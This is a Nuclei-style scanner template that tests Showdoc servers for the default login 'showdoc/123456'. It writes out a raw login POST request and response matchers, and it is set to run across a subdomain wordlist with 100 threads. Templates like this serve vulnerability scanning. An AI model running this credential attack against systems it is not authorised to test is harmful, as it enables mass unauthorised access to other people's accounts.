id: showdoc-default-password
info:
  author: pikpikcu
  name: Showdoc Default Password
  reference: '- https://blog.star7th.com/2016/05/2007.html

    '
  severity: medium
  tags: showdoc,default-login
requests:
- attack: sniper
  matchers:
  - condition: and
    type: word
    words:
    - '"username":"showdoc"'
    - '"user_token":'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /server/index.php?s=/api/user/login HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8


    username=showdoc&password=123456&v_code=

    '
  threads: 100
